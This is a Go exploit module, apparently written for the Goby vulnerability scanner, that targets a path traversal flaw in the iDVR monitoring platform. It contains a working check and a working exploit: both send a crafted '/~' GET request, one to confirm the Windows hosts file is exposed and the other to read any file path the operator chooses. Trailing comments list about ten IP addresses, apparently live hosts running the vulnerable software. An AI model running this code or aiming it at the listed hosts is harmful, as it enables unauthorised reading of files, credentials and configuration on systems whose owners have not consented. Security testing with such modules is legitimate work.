package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "iDVR system file traversal",
    "Description": "IDVR multi-stage monitoring platform ~ C: / WINDOWS/system32 / drivers/etc/hosts file traversal file downloads",
    "Product": "iDVR",
    "Homepage": "http://code.google.com/p/idvr/",
    "DisclosureDate": "2021-06-01",
    "Author": "atdpa4sw0rd@gmail.com",
    "GobyQuery": "product=\"iDVR\"",
    "Level": "3",
    "Impact": "<p>Direct access to the attacker to sensitive data, implement the download the file to the client, but if there is no filtering of the incoming parameters, you can achieve any file download service, including configuration files, log, source code, etc., to produce arbitrary files download, can lead to hackers successfully to enter the sensitive information of database or system. Causes the website or the server to collapse.</p>",
    "Recommendation": "<p>1, before the download of the incoming parameters to filter, directly will.. Replace it with empty, and you can easily achieve the purpose of prevention.</p><p>2. Check the download file type to determine whether the download type is allowed.</p><p>3. Upgrade to the latest version</p>",
    "References": [
        "https://github.com/cflq3/poc/blob/master/bugscan/exp-2031.py"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "C:/WINDOWS/system32/drivers/etc/hosts"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "Disclosure of Sensitive Information",
        "File Inclusion"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10209"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg_get := httpclient.NewGetRequestConfig("/~C:/WINDOWS/system32/drivers/etc/hosts")
			cfg_get.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg_get.FollowRedirect = false
			cfg_get.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg_get); err == nil {
				return resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, "This is a sample HOSTS file used by") && strings.Contains(resp.Utf8Html, "Microsoft Corp"))
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)
			cfg_get := httpclient.NewGetRequestConfig("/~" + filePath)
			cfg_get.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg_get.FollowRedirect = false
			cfg_get.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_get); err == nil {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}

// 61.55.88.159:81
// 114.34.121.66:80
// 114.34.121.66
// 114.34.121.66:81
// 114.33.24.93
// 114.33.24.93:80
// 220.128.123.192
// 114.33.135.176:81
// 114.33.135.176:81
// 220.128.123.192:80
